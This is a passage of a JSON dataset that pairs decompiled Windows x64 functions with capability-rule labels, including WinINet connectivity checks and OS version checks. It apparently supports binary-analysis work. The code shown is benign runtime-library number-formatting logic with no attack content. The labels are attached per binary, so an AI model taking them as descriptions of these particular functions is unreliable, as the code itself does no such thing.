        "decompiled_code": "\nvoid fcn.140012e20(ulong arg1, char *arg2, ulong arg3, int64_t arg4)\n\n{\n    char cVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint64_t uVar5;\n    \n    iVar4 = *(arg4 + 0xc);\n    if (arg3 < 1) {\n        if (iVar4 < 1) {\n            if ((iVar4 == 0) && (*(arg4 + 0x10) < 0)) {\n                iVar4 = -*(arg4 + 0x10);\n                *(arg4 + 0xc) = iVar4;\ncode_r0x0001400130a8:\n                if ((*(arg4 + 8) & 0x800) != 0) goto code_r0x000140012e61;\n                if ((0 < arg3) && ((*(arg4 + 8) & 0x1000) != 0)) goto code_r0x0001400130c5;\n                goto code_r0x000140012e79;\n            }\n        }\n        else {\n            iVar3 = *(arg4 + 0x10);\n            iVar4 = iVar4 + -1;\n            if (iVar3 < iVar4) goto code_r0x000140012e54;\n        }\n        *(arg4 + 0xc) = 0xffffffff;\n        if (arg1 == 0) goto code_r0x000140012ec3;\ncode_r0x000140012fa0:\n        fcn.140012060(0x2d, arg4);\n    }\n    else {\n        if (iVar4 < arg3) {\n            *(arg4 + 0xc) = 0xffffffff;\n            if (((*(arg4 + 9) & 0x10) != 0) && (*(arg4 + 0x20) != 0)) {\n                iVar4 = -1;\n                uVar2 = (arg3 + 2U) / 3;\n                if ((arg3 + 2U) / 3 != 1) {\ncode_r0x00014001314b:\n                    iVar3 = (uVar2 - 1) - iVar4;\n                    do {\n                        if (iVar4 < 1) goto code_r0x000140012ebb;\n                        iVar4 = iVar4 + -1;\n                        *(arg4 + 0xc) = iVar4;\n                    } while (iVar3 + iVar4 != 0);\n                    goto code_r0x000140012e75;\n                }\n            }\ncode_r0x000140012ebb:\n            if (arg1 != 0) goto code_r0x000140012fa0;\ncode_r0x000140012ec3:\n            uVar2 = *(arg4 + 8);\n        }\n        else {\n            iVar3 = *(arg4 + 0x10);\n            iVar4 = iVar4 - arg3;\n            if (iVar3 < iVar4) {\ncode_r0x000140012e54:\n                iVar4 = iVar4 - iVar3;\n                *(arg4 + 0xc) = iVar4;\n                if (iVar3 < 1) goto code_r0x0001400130a8;\ncode_r0x000140012e61:\n                iVar4 = iVar4 + -1;\n                *(arg4 + 0xc) = iVar4;\n                if ((0 < arg3) && ((*(arg4 + 9) & 0x10) != 0)) {\ncode_r0x0001400130c5:\n                    if (*(arg4 + 0x20) != 0) goto code_r0x0001400131b2;\n                }\n            }\n            else {\n                *(arg4 + 0xc) = 0xffffffff;\n                if (((*(arg4 + 9) & 0x10) == 0) || (*(arg4 + 0x20) == 0)) goto code_r0x000140012ebb;\n                iVar4 = -1;\ncode_r0x0001400131b2:\n                uVar2 = (arg3 + 2) / 3;\n                if (uVar2 != 1) goto code_r0x00014001314b;\n            }\ncode_r0x000140012e75:\n            if (iVar4 < 1) goto code_r0x000140012ebb;\ncode_r0x000140012e79:\n            if (arg1 != 0) {\n                *(arg4 + 0xc) = iVar4 + -1;\n                if ((iVar4 + -1 == 0) || ((*(arg4 + 8) & 0x600) != 0)) goto code_r0x000140012fa0;\ncode_r0x000140013063:\n                iVar4 = iVar4 + -2;\ncode_r0x000140013066:\n                *(arg4 + 0xc) = iVar4;\n                do {\n                    fcn.140012060(0x20, arg4);\n                    iVar4 = *(arg4 + 0xc);\n                    *(arg4 + 0xc) = iVar4 + -1;\n                } while (0 < iVar4);\n                goto code_r0x000140012ebb;\n            }\n            uVar2 = *(arg4 + 8);\n            if ((uVar2 & 0x1c0) == 0) {\n                iVar4 = iVar4 + -1;\n                if ((uVar2 & 0x600) == 0) goto code_r0x000140013066;\n            }\n            else {\n                *(arg4 + 0xc) = iVar4 + -1;\n                if ((iVar4 + -1 != 0) && ((uVar2 & 0x600) == 0)) goto code_r0x000140013063;\n            }\n        }\n        if ((uVar2 & 0x100) == 0) {\n            if ((uVar2 & 0x40) != 0) {\n                fcn.140012060(0x20, arg4);\n            }\n        }\n        else {\n            fcn.140012060(0x2b, arg4);\n        }\n    }\n    if ((0 < *(arg4 + 0xc)) && ((*(arg4 + 8) & 0x600) == 0x200)) {\n        *(arg4 + 0xc) = *(arg4 + 0xc) + -1;\n        do {\n            fcn.140012060(0x30, arg4);\n            iVar4 = *(arg4 + 0xc);\n            *(arg4 + 0xc) = iVar4 + -1;\n        } while (0 < iVar4);\n    }\n    if (arg3 < 1) {\n        fcn.140012060(0x30, arg4);\n        iVar4 = *(arg4 + 0x10);\n        if ((0 < iVar4) || ((*(arg4 + 9) & 8) != 0)) goto code_r0x000140013018;\n        if (arg3 == 0) goto code_r0x000140012f61;\n    }\n    else {\n        while( true ) {\n            cVar1 = *arg2;\n            uVar5 = 0x30;\n            if (cVar1 != '\\0') {\n                arg2 = arg2 + 1;\n                uVar5 = cVar1;\n            }\n            fcn.140012060(uVar5, arg4);\n            arg3._0_4_ = arg3 + -1;\n            if (arg3 == 0) break;\n            if ((((*(arg4 + 9) & 0x10) != 0) && (*(arg4 + 0x20) != 0)) && (arg3 * -0x55555555 < 0x55555556)) {\n                fcn.1400120c0(arg4 + 0x20, 1, arg4);\n            }\n        }\n        iVar4 = *(arg4 + 0x10);\n        if (0 < iVar4) {\n            fcn.140012cd0(arg4);\n            goto code_r0x000140012fe3;\n        }\n        if ((*(arg4 + 9) & 8) == 0) {\ncode_r0x000140012f61:\n            *(arg4 + 0x10) = iVar4 + -1;\n            return;\n        }\ncode_r0x000140013018:\n        fcn.140012cd0(arg4);\n        if (arg3 == 0) goto code_r0x000140012fe3;\n        iVar4 = *(arg4 + 0x10);\n    }\n    *(arg4 + 0x10) = iVar4 + arg3;\n    do {\n        fcn.140012060(0x30, arg4);\n        arg3._0_4_ = arg3 + 1;\n    } while (arg3 != 0);\ncode_r0x000140012fe3:\n    while (iVar4 = *(arg4 + 0x10),  *(arg4 + 0x10) = iVar4 + -1,  0 < iVar4) {\n        cVar1 = *arg2;\n        uVar5 = 0x30;\n        if (cVar1 != '\\0') {\n            arg2 = arg2 + 1;\n            uVar5 = cVar1;\n        }\n        fcn.140012060(uVar5, arg4);\n    }\n    return;\n}\n",
        "token_count": 2071
    },
    "1400135d": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.1400135d0(uint64_t arg1, ulong arg2, int64_t *arg3)\n\n{\n    char *pcVar1;\n    char cVar2;\n    uint8_t uVar3;\n    uint32_t uVar4;\n    int64_t iVar5;\n    uint32_t uVar6;\n    int32_t iVar7;\n    int32_t iVar8;\n    uint64_t uVar9;\n    uint64_t uVar10;\n    char *pcVar11;\n    uint8_t *puVar12;\n    char *pcVar13;\n    int32_t iVar14;\n    int32_t iVar15;\n    int32_t iVar16;\n    ulong auStack112 [2];\n    int16_t iStack90;\n    uint8_t uStack88;\n    uint8_t auStack87 [15];\n    char acStack72 [24];\n    \n    uVar6 = *(arg3 + 2);\n    if ((arg2 == 0) && (arg1 == 0)) {\n        if (uVar6 < 0xf) {\n            arg2._0_2_ = 0;\ncode_r0x0001400136a5:\n            uVar3 = ('\\x0f' - uVar6) * '\\x04';\n            uVar10 = (4 << (('\\x0e' - uVar6) * '\\x04' & 0x3fU)) + (arg1 >> 1);\n            if (uVar10 < 0) {\n                arg2._0_2_ = arg2 + 4;\n                arg1 = (uVar10 >> 3) >> (uVar3 & 0x3f);\n            }\n            else {\n                arg1 = uVar10 * 2 >> (uVar3 & 0x3f);\n                if ((arg1 == 0) && (uVar6 == 0)) {\n                    uVar6 = *(arg3 + 1);\n                    uVar10 = arg2;\n                    goto code_r0x0001400136f6;\n                }\n            }\n            iVar7 = uVar6 + 1;\n            uVar10 = arg2;\n        }\n        else {\n            if (uVar6 < 1) {\n                uVar6 = *(arg3 + 1);\n                uVar10 = 0;\n                arg2._0_2_ = 0;\n                goto code_r0x0001400136f6;\n            }\n            uVar10 = 0;\n            arg2._0_2_ = 0;\n            iVar7 = 0x10;\n            arg1 = 0;\n        }\ncode_r0x000140013614:\n        uVar6 = *(arg3 + 1);\n        puVar12 = &uStack88;\n        do {\n            uVar4 = arg1 & 0xf;\n            cVar2 = uVar4;\n            if (iVar7 == 1) {\n                if (((&uStack88 < puVar12) || ((uVar6 & 0x800) != 0)) || (0 < *(arg3 + 2))) {\n                    *puVar12 = 0x2e;\n                    puVar12 = puVar12 + 1;\n                    goto code_r0x000140013682;\n                }\n                if ((arg1 & 0xf) == 0) {\n                    if (*(arg3 + 2) == 0) {\n                        *puVar12 = 0x30;\n                        puVar12 = puVar12 + 1;\n                    }\n                    break;\n                }\ncode_r0x000140013686:\n                if (uVar4 < 10) {\ncode_r0x000140013648:\n                    uVar3 = cVar2 + 0x30;\n                }\n                else {\n                    uVar3 = cVar2 + 0x37U | uVar6 & 0x20;\n                }\n                *puVar12 = uVar3;\n                puVar12 = puVar12 + 1;\n            }\n            else {\n                if (0 < *(arg3 + 2)) {\n                    *(arg3 + 2) = *(arg3 + 2) + -1;\n                }\ncode_r0x000140013682:\n                if ((arg1 & 0xf) != 0) goto code_r0x000140013686;\n                if ((&uStack88 < puVar12) || (-1 < *(arg3 + 2))) goto code_r0x000140013648;\n            }\n            arg1 = arg1 >> 4;\n            iVar7 = iVar7 + -1;\n        } while (iVar7 != 0);\n        if (puVar12 == &uStack88) {\n            if (*(arg3 + 2) < 1) goto code_r0x0001400136f6;\n            goto code_r0x0001400136fe;\n        }\n        iVar7 = *(arg3 + 0xc);\n        iVar16 = 2;\n        if (0 < iVar7) goto code_r0x00014001385c;\ncode_r0x000140013722:\n        if ((uVar6 & 0x80) != 0) goto code_r0x000140013920;\ncode_r0x00014001372b:\n        if ((uVar6 & 0x100) == 0) {\n            if ((uVar6 & 0x40) != 0) {\n                fcn.140012060(0x20, arg3);\n            }\n        }\n        else {\n            fcn.140012060(0x2b, arg3);\n        }\n    }\n    else {\n        arg2._0_2_ = arg2 + -3;\n        if (uVar6 < 0xf) goto code_r0x0001400136a5;\n        uVar10 = arg2;\n        iVar7 = 0x10;\n        if ((arg1 != 0) || (0 < uVar6)) goto code_r0x000140013614;\n        uVar6 = *(arg3 + 1);\ncode_r0x0001400136f6:\n        puVar12 = &uStack88;\n        if ((uVar6 & 0x800) != 0) {\ncode_r0x0001400136fe:\n            uStack88 = 0x2e;\n            puVar12 = auStack87;\n        }\n        iVar7 = *(arg3 + 0xc);\n        *puVar12 = 0x30;\n        puVar12 = puVar12 + 1;\n        iVar16 = 2;\n        if (iVar7 < 1) goto code_r0x000140013722;\ncode_r0x00014001385c:\n        iVar16 = 2;\n        iVar8 = puVar12 - (*0x20 + -0x58);\n        if (0 < *(arg3 + 2)) {\n            iVar8 = *(arg3 + 2) + iVar8;\n        }\n        iVar14 = (iVar8 + 6) - ((uVar6 & 0x1c0) == 0);\n        iVar8 = arg2 / 10 - (arg2 >> 0x1f);\n        iVar15 = iVar14;\n        if (iVar8 != 0) {\n            do {\n                iVar15 = iVar15 + 1;\n                iVar8 = iVar8 / 10;\n            } while (iVar8 != 0);\n            iVar16 = (iVar15 - iVar14) + 2;\n        }\n        if (iVar7 <= iVar15) {\n            iVar7 = -1;\ncode_r0x0001400139c6:\n            *(arg3 + 0xc) = iVar7;\n            goto code_r0x000140013722;\n        }\n        iVar7 = iVar7 - iVar15;\n        if ((uVar6 & 0x600) != 0) goto code_r0x0001400139c6;\n        *(arg3 + 0xc) = iVar7 + -1;\n        do {\n            fcn.140012060(0x20, arg3);\n            iVar7 = *(arg3 + 0xc);\n            *(arg3 + 0xc) = iVar7 + -1;\n        } while (0 < iVar7);\n        uVar6 = *(arg3 + 1);\n        if ((uVar6 & 0x80) == 0) goto code_r0x00014001372b;\ncode_r0x000140013920:\n        fcn.140012060(0x2d, arg3);\n    }\n    fcn.140012060(0x30, arg3);\n    fcn.140012060(*(arg3 + 1) & 0x20 | 0x58, arg3);\n    if ((0 < *(arg3 + 0xc)) && ((*(arg3 + 9) & 2) != 0)) {\n        *(arg3 + 0xc) = *(arg3 + 0xc) + -1;\n        do {\n            fcn.140012060(0x30, arg3);\n            iVar7 = *(arg3 + 0xc);\n            *(arg3 + 0xc) = iVar7 + -1;\n        } while (0 < iVar7);\n    }\n    if (&uStack88 < puVar12) {\n        do {\n            uVar6 = puVar12[-1];\n            puVar12 = puVar12 + -1;\n            if (uVar6 == 0x2e) {\n                fcn.140012cd0(arg3);\n            }\n            else if (uVar6 == 0x2c) {\n                iStack90 = *(arg3 + 4);\n                if (*(arg3 + 4) != 0) {\n                    fcn.1400120c0(&iStack90, 1, arg3);\n                }\n            }\n            else {\n                fcn.140012060(uVar6, arg3);\n            }\n        } while (puVar12 != &uStack88);\n    }\n    while (iVar7 = *(arg3 + 2),  *(arg3 + 2) = iVar7 + -1,  0 < iVar7) {\n        fcn.140012060(0x30, arg3);\n    }\n    fcn.140012060(*(arg3 + 1) & 0x20 | 0x50, arg3);\n    *(arg3 + 0xc) = *(arg3 + 0xc) + iVar16;\n    *(arg3 + 1) = *(arg3 + 1) | 0x1c0;\n    iVar7 = *(arg3 + 2);\n    uVar6 = *(arg3 + 1);\n    iVar16 = *(arg3 + 0xc);\n    auStack112[0] = 0x140012997;\n    iVar5 = fcn.14000e880(uVar10);\n    iVar5 = -iVar5;\n    pcVar1 = acStack72 + iVar5;\n    if ((uVar6 & 0x80) == 0) {\ncode_r0x0001400129b6:\n        pcVar11 = pcVar1;\n        if (uVar10 != 0) goto code_r0x0001400129c2;\n    }\n    else {\n        if (-1 < uVar10) {\n            uVar6 = uVar6 & 0xffffff7f;\n            *(arg3 + 1) = uVar6;\n            goto code_r0x0001400129b6;\n        }\n        uVar10 = -uVar10;\ncode_r0x0001400129c2:\n        pcVar11 = pcVar1;\n        while( true ) {\n            pcVar13 = pcVar11;\n            pcVar11 = pcVar13 + 1;\n            uVar9 = uVar10 / 10;\n            *pcVar13 = uVar10 + uVar9 * -10 + '0';\n            if (uVar10 < 10) break;\n            uVar10 = uVar9;\n            if ((((pcVar1 != pcVar11) && ((uVar6 & 0x1000) != 0)) && (*(arg3 + 4) != 0)) &&\n               ((pcVar11 - pcVar1 & 0x8000000000000003U) == 3)) {\n                *pcVar11 = ',';\n                pcVar11 = pcVar13 + 2;\n            }\n        }\n    }\n    pcVar13 = pcVar11;\n    if (iVar7 < 1) {\ncode_r0x000140012a80:\n        pcVar11 = pcVar13;\n        if ((pcVar1 != pcVar13) || (iVar7 == 0)) goto code_r0x000140012a91;\n    }\n    else {\n        iVar8 = iVar7 - (pcVar11 - pcVar1);\n        if (0 < iVar8) {\n            pcVar13 = pcVar11 + iVar8;\n            *(auStack112 + iVar5) = 0x140012a80;\n            sub.msvcrt.dll_memset(pcVar11, 0x30, iVar8);\n            goto code_r0x000140012a80;\n        }\n        pcVar13 = pcVar1;\n        if (pcVar1 != pcVar11) goto code_r0x000140012a91;\n    }\n    *pcVar13 = '0';\n    pcVar11 = pcVar13 + 1;\ncode_r0x000140012a91:\n    if (0 < iVar16) {\n        iVar16 = iVar16 - (pcVar11 - pcVar1);\n        *(arg3 + 0xc) = iVar16;\n        if (0 < iVar16) {\n            if ((uVar6 & 0x1c0) != 0) {\n                *(arg3 + 0xc) = iVar16 + -1;\n            }\n            if ((iVar7 < 0) && ((uVar6 & 0x600) == 0x200)) {\n                iVar7 = *(arg3 + 0xc);\n                *(arg3 + 0xc) = iVar7 + -1;\n                if (0 < iVar7) {\n                    *(auStack112 + iVar5) = 0x140012c79;\n                    sub.msvcrt.dll_memset(pcVar11, 0x30, iVar7);\n                    *(arg3 + 0xc) = 0xffffffff;\n                    pcVar11 = pcVar11 + iVar7;\n                }\n            }\n            else if (((uVar6 & 0x400) == 0) && (iVar7 = *(arg3 + 0xc),  *(arg3 + 0xc) = iVar7 + -1,  0 < iVar7)) {\n                do {\n                    *(auStack112 + iVar5) = 0x140012cad;\n                    fcn.140012060(0x20, arg3);\n                    iVar7 = *(arg3 + 0xc);\n                    *(arg3 + 0xc) = iVar7 + -1;\n                } while (0 < iVar7);\n                uVar6 = *(arg3 + 1);\n            }\n        }\n    }\n    if ((uVar6 & 0x80) == 0) {\n        if ((uVar6 & 0x100) == 0) {\n            if ((uVar6 & 0x40) != 0) {\n                *pcVar11 = ' ';\n                pcVar11 = pcVar11 + 1;\n            }\n        }\n        else {\n            *pcVar11 = '+';\n            pcVar11 = pcVar11 + 1;\n        }\n    }\n    else {\n        *pcVar11 = '-';\n        pcVar11 = pcVar11 + 1;\n    }\n    if (pcVar1 < pcVar11) {\n        do {\n            pcVar11 = pcVar11 + -1;\n            if (((uVar6 & 0x4000) == 0) && (iVar7 = *(arg3 + 0x24),  *(arg3 + 5) == iVar7 || *(arg3 + 5) < iVar7)) {\ncode_r0x000140012afa:\n                *(arg3 + 0x24) = iVar7 + 1;\n            }\n            else {\n                if ((uVar6 & 0x2000) == 0) {\n                    *(*arg3 + *(arg3 + 0x24)) = *pcVar11;\n                    iVar7 = *(arg3 + 0x24);\n                    goto code_r0x000140012afa;\n                }\n                *(auStack112 + iVar5) = 0x140012b32;\n                sub.msvcrt.dll_fputc();\n                *(arg3 + 0x24) = *(arg3 + 0x24) + 1;\n            }\n            if (pcVar1 == pcVar11) break;\n            uVar6 = *(arg3 + 1);\n        } while( true );\n    }\n    iVar7 = *(arg3 + 0xc);\n    while( true ) {\n        *(arg3 + 0xc) = iVar7 + -1;\n        if (iVar7 < 1) break;\n        if (((*(arg3 + 1) & 0x4000) != 0) ||\n           (iVar16 = *(arg3 + 0x24),  iVar7 = iVar7 + -1,  *(arg3 + 5) != iVar16 && iVar16 <= *(arg3 + 5))) {\n            if ((*(arg3 + 1) & 0x2000) == 0) {\n                *(*arg3 + *(arg3 + 0x24)) = 0x20;\n                iVar16 = *(arg3 + 0x24);\n                iVar7 = *(arg3 + 0xc);\n            }\n            else {\n                *(auStack112 + iVar5) = 0x140012b8a;\n                sub.msvcrt.dll_fputc();\n                iVar16 = *(arg3 + 0x24);\n                iVar7 = *(arg3 + 0xc);\n            }\n        }\n        *(arg3 + 0x24) = iVar16 + 1;\n    }\n    return;\n}\n",
        "token_count": 3938
    },
    "1400147b": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Possible PIC construction at 0x000140014ad5: Changing call to branch\n// WARNING: Removing unreachable block (ram,0x000140014ada)\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t * fcn.1400147b0(int32_t *arg1, ulong arg2, uint32_t *arg3, uint32_t *arg4)\n\n{\n    uint32_t uVar1;\n    bool bVar2;\n    bool bVar3;\n    int32_t iVar4;\n    uint32_t *puVar5;\n    uint32_t uVar6;\n    int32_t iVar7;\n    int32_t iVar8;\n    uint64_t uVar9;\n    int64_t iVar10;\n    uint64_t arg1_00;\n    int64_t iVar11;\n    char *pcVar12;\n    uint64_t uVar13;\n    uint32_t *puVar14;\n    uint32_t uVar15;\n    uint32_t *puVar16;\n    uint32_t *puVar17;\n    uint64_t unaff_RBX;\n    uint32_t *unaff_RSI;\n    uint64_t unaff_RDI;\n    uint8_t uVar18;\n    int32_t iVar19;\n    int64_t iVar20;\n    uint32_t uVar21;\n    uint64_t extraout_XMM0_Qa;\n    double dVar22;\n    double dVar23;\n    double dVar24;\n    double dVar25;\n    double dVar26;\n    uint32_t in_stack_00000028;\n    uint32_t in_stack_00000030;\n    uint32_t *in_stack_00000038;\n    uint32_t **in_stack_00000040;\n    ulong uStack256;\n    uint32_t *puStack216;\n    uint32_t **ppuStack208;\n    uint64_t uStack200;\n    ulong uStack192;\n    uint32_t *puStack184;\n    ulong uStack176;\n    ulong uStack168;\n    uint32_t uStack160;\n    uint32_t uStack156;\n    ulong uStack152;\n    uint32_t *puStack144;\n    ulong uStack136;\n    uint32_t uStack128;\n    int32_t iStack124;\n    uint32_t uStack120;\n    int32_t iStack116;\n    double dStack112;\n    double dStack104;\n    uint32_t uStack96;\n    uint32_t uStack92;\n    uint32_t uStack76;\n    \n    uVar21 = *arg4;\n    uStack192 = uStack192 & 0xffffffff00000000 | in_stack_00000030;\n    uStack200 = uStack200 & 0xffffffff00000000 | arg2;\n    puStack216 = in_stack_00000038;\n    puStack184 = arg4;\n    ppuStack208 = in_stack_00000040;\n    *arg4 = uVar21 & 0xffffffcf;\n    uVar6 = uVar21 & 7;\n    if (uVar6 == 3) {\n        uVar21 = 8;\n        pcVar12 = \"Infinity\";\n        *in_stack_00000038 = 0xffff8000;\n        goto code_r0x000140014580;\n    }\n    uVar9 = uVar21 & 4;\n    uStack176 = uStack176 & 0xffffffff00000000 | uVar21 & 0xffffffff00000004;\n    if ((uVar21 & 4) != 0) {\n        if (uVar6 != 4) {\n            return NULL;\n        }\n        uVar21 = 3;\n        pcVar12 = 0x140102819;\n        *in_stack_00000038 = 0xffff8000;\n        goto code_r0x000140014580;\n    }\n    if (uVar6 != 0) {\n        iVar8 = *arg1;\n        uVar9 = 0;\n        iVar7 = 0x20;\n        if (0x20 < iVar8) {\n            do {\n                iVar19 = iVar7 * 2;\n                uVar9 = uVar9 + 1;\n                iVar4 = iVar7 * -2;\n                iVar7 = iVar19;\n            } while (iVar8 != iVar19 && SBORROW4(iVar8, iVar19) == iVar8 + iVar4 < 0);\n        }\n        uStack256 = 0x14001484d;\n        uVar9 = fcn.140016f80(uVar9);\n        iVar20 = iVar8 + -1 >> 5;\n        puVar16 = arg3;\n        puVar14 = uVar9 + 0x18;\n        do {\n            uVar6 = *puVar16;\n            puVar16 = puVar16 + 1;\n            *puVar14 = uVar6;\n            puVar14 = puVar14 + 1;\n        } while (puVar16 <= arg3 + iVar20);\n        iVar10 = iVar20 * 4 + 4;\n        if (arg3 + iVar20 + 1U < arg3 + 1U) {\n            iVar10 = 4;\n        }\n        uVar13 = iVar10 >> 2 & 0xffffffff;\n        iVar20 = uVar9 + (iVar10 >> 2) * 4;\ncode_r0x0001400148bd:\n        iVar7 = uVar13;\n        uVar6 = iVar7 - 1;\n        uVar13 = uVar6;\n        if (*(iVar20 + 0x14) == 0) goto code_r0x0001400148b0;\n        *(uVar9 + 0x14) = iVar7;\n        puVar16 = uVar9 + 0x18 + uVar6 * 4;\n        uVar6 = 0x1f;\n        if (*puVar16 != 0) {\n            for (; *puVar16 >> uVar6 == 0; uVar6 = uVar6 - 1) {\n            }\n        }\n        uVar6 = iVar7 * 0x20 - (uVar6 ^ 0x1f);\n        goto code_r0x0001400148e4;\n    }\n    goto code_r0x000140014ab8;\ncode_r0x0001400148b0:\n    iVar20 = iVar20 + -4;\n    if (uVar6 == 0) goto code_r0x000140014b20;\n    goto code_r0x0001400148bd;\ncode_r0x0001400154b3:\n    uStack256 = 0x1400154c3;\n    uVar9 = fcn.1400170e0(uVar9, 10, 0);\n    if (iVar10 == iVar20) {\n        uStack256 = 0x1400155fd;\n        iVar10 = fcn.1400170e0(iVar10, 10, 0);\n        iVar20 = iVar10;\n    }\n    else {\n        uStack256 = 0x1400154df;\n        iVar10 = fcn.1400170e0(iVar10, 10, 0);\n        uStack256 = 0x1400154f2;\n        iVar20 = fcn.1400170e0(iVar20, 10, 0);\n    }\n    uStack76 = uStack76 + 1;\n    puVar14 = puVar16;\n    goto code_r0x000140015502;\ncode_r0x000140014dfb:\n    uVar18 = uVar15 + 1;\ncode_r0x000140014e04:\n    *puVar16 = uVar18;\n    uStack136._0_4_ = uVar21 + 1;\n    uStack176 = CONCAT44(uStack176._4_4_, 0x20);\n    puVar17 = puStack144;\n    puVar16 = puVar14;\n    goto code_r0x000140015005;\ncode_r0x000140014b20:\n    *(uVar9 + 0x14) = 0;\ncode_r0x0001400148e4:\n    uStack256 = 0x1400148ec;\n    uStack76 = fcn.140016980(uVar9);\n    uStack152 = uStack200 & 0xffffffff | uStack152._4_4_ << 0x20;\n    if (uStack76 != 0) {\n        uStack256 = 0x140014b3a;\n        fcn.140016880(uVar9, uStack76);\n        uVar6 = uVar6 - uStack76;\n        uStack152 = uStack152 & 0xffffffff00000000 | uStack200 + uStack76;\n    }\n    if (*(uVar9 + 0x14) != 0) {\n        uStack256 = 0x140014920;\n        fcn.140017880(uVar9, &stack0xffffffffffffffb4);\n        iVar19 = uStack152 + uVar6;\n        iVar7 = iVar19 + -1;\n        uVar15 = extraout_XMM0_Qa >> 0x20 & 0xfffff | 0x3ff00000;\n        iVar4 = 1 - iVar19;\n        if (-1 < iVar7) {\n            iVar4 = iVar7;\n        }\n        dVar22 = ((extraout_XMM0_Qa & 0xffffffff | uVar15 << 0x20) - *0x140102820) * *0x140102828 + *0x140102830 +\n                 iVar7 * *0x140102838;\n        if (0 < iVar4 + -0x435) {\n            dVar22 = dVar22 + (iVar4 + -0x435) * *0x140102840;\n        }\n        uStack128 = dVar22;\n        if ((dVar22 < 0.0) && (uStack128 != dVar22)) {\n            uStack128 = uStack128 - 1;\n        }\n        dStack104 = extraout_XMM0_Qa & 0xffffffff | uVar15 + iVar7 * 0x100000 << 0x20;\n        iVar7 = uVar6 - iVar7;\n        uStack156 = iVar7 - 1;\n        if (uStack128 < 0x17) {\n            if (dStack104 < *(*0x140103700 + uStack128 * 8)) {\n                iStack116 = 0;\n                uStack128 = uStack128 - 1;\n                goto code_r0x000140014b63;\n            }\n            iStack116 = 0;\n            uStack136 = uStack136._4_4_ << 0x20;\n            if (iVar7 < 1) {\n                uStack156 = 0;\n                uStack136 = CONCAT44(uStack136._4_4_, 1 - iVar7);\n            }\ncode_r0x000140014a50:\n            uStack156 = uStack156 + uStack128;\n            uStack120 = 0;\n            uVar15 = uStack128;\n        }\n        else {\n            iStack116 = 1;\ncode_r0x000140014b63:\n            uStack136 = uStack136._4_4_ << 0x20;\n            if (uStack156 < 0) {\n                uStack156 = 0;\n                uStack136 = CONCAT44(uStack136._4_4_, 1 - iVar7);\n            }\n            if (-1 < uStack128) goto code_r0x000140014a50;\n            uStack136 = uStack136 & 0xffffffff00000000 | uStack136 - uStack128;\n            uStack120 = -uStack128;\n            uVar15 = 0;\n        }\n        if (in_stack_00000028 < 10) {\n            if (in_stack_00000028 < 6) {\n                bVar2 = iVar19 + 0x3fdU < 0x7f8;\n                if (in_stack_00000028 == 4) {\ncode_r0x000140015924:\n                    iStack124 = 1;\n                }\n                else {\n                    if (in_stack_00000028 == 5) {\ncode_r0x000140015788:\n                        iStack124 = 1;\n                        goto code_r0x000140014f00;\n                    }\n                    if (in_stack_00000028 != 2) {\n                        if (in_stack_00000028 == 3) {\n                            iStack124 = 0;\n                            goto code_r0x000140014f00;\n                        }\n                        goto code_r0x000140014e38;\n                    }\n                    iStack124 = 0;\n                }\ncode_r0x000140014bf5:\n                uVar13 = 1;\n                if (0 < uStack192) {\n                    uVar13 = uStack192 & 0xffffffff;\n                }\n                uStack76 = uVar13;\n                uStack168 = uStack168 & 0xffffffff00000000 | uVar13;\n                uStack192 = uStack192 & 0xffffffff00000000 | uVar13;\n                uStack92 = uStack76;\n            }\n            else {\n                in_stack_00000028 = in_stack_00000028 - 4;\n                bVar2 = false;\n                if (in_stack_00000028 == 4) goto code_r0x000140015924;\n                if (in_stack_00000028 == 5) goto code_r0x000140015788;\n                iStack124 = 0;\n                if (in_stack_00000028 == 2) goto code_r0x000140014bf5;\n                in_stack_00000028 = 3;\ncode_r0x000140014f00:\n                uStack92 = uStack128 + uStack192;\n                uVar1 = uStack92 + 1;\n                uStack168 = uStack168 & 0xffffffff00000000 | uVar1;\n                uVar13 = 1;\n                if (0 < uVar1) {\n                    uVar13 = uVar1;\n                }\n                uStack76 = uVar13;\n            }\n            uStack256 = 0x140014c30;\n            dStack112 = dStack104;\n            uStack96 = uVar15;\n            puStack144 = fcn.140014540(uVar13);\n            uStack160 = arg1[3] - 1;\n            dVar22 = dStack112;\n            uStack192._0_4_ = uStack96;\n            if (uStack160 == 0) {\ncode_r0x000140014c7a:\n                iVar20 = *0x140103700;\n                dVar24 = *0x140102858;\n                bVar2 = bVar2 & uStack168 < 0xf;\n                if ((!bVar2) || ((uStack128 | uStack160) != 0)) goto code_r0x0001400150a0;\n                uStack76 = 0;\n                if ((iStack116 != 0) && (dStack104 < *0x140102850)) {\n                    if (uStack168 == 0) {\n                        dVar22 = dStack104 + dStack104 + *0x140102868;\n                        dVar25 = dVar22 & 0xffffffff | (dVar22 >> 0x20) + 0xfcc00000 << 0x20;\n                        goto code_r0x000140015065;\n                    }\n                    if (0 < uStack92) {\n                        dVar22 = dStack104 * *0x140102858;\n                        uVar21 = 0xffffffff;\n                        dVar25 = *0x140102860 * dVar22 + *0x140102868;\n                        dVar25 = dVar25 & 0xffffffff | (dVar25 >> 0x20) + 0xfcc00000 << 0x20;\n                        uStack168._0_4_ = uStack92;\n                        dVar23 = dVar22;\n                        goto code_r0x000140014d0d;\n                    }\ncode_r0x00014001508e:\n                    uStack160 = 0;\n                    goto code_r0x0001400150a0;\n                }\n                dVar25 = dStack104 + dStack104 + *0x140102868;\n                dVar25 = dVar25 & 0xffffffff | (dVar25 >> 0x20) + 0xfcc00000 << 0x20;\n                if (uStack168 != 0) {\n                    uVar21 = 0;\n                    dVar23 = dStack104;\ncode_r0x000140014d0d:\n                    dVar26 = *(*0x140103700 + (uStack168 - 1) * 8);\n                    if (iStack124 != 0) {\n                        puVar16 = puStack144 + 1;\n                        dVar25 = *0x140102890 / dVar26 - dVar25;\n                        *puStack144 = dVar23 + 0x30;\n                        dVar24 = *0x140102858;\n                        dVar22 = *0x140102850;\n                        dVar23 = dVar23 - dVar23;\n                        puVar14 = puVar16;\n                        if (dVar25 <= 